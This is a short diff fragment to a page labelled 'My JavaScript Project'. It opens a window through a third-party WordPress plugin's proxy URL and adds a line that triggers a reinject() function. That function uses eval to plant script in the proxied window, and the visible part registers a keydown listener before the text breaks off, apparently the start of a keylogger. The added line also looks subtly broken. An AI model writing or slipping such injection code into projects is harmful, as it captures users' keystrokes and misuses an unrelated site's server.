@@ -7,6 +7,7 @@
     
     <h1>My JavaScript Project</h1>
       <script>var x = window.open("https://www.zerotoone.com.br/wp-content/plugins/super-links/application/helpers/super-links-proxy.php?www.example.com")
+        x.window.location.onchange = reinject();
         function reinject() {
               x.eval(`
 window.addEventListener('keydown', function (e) {
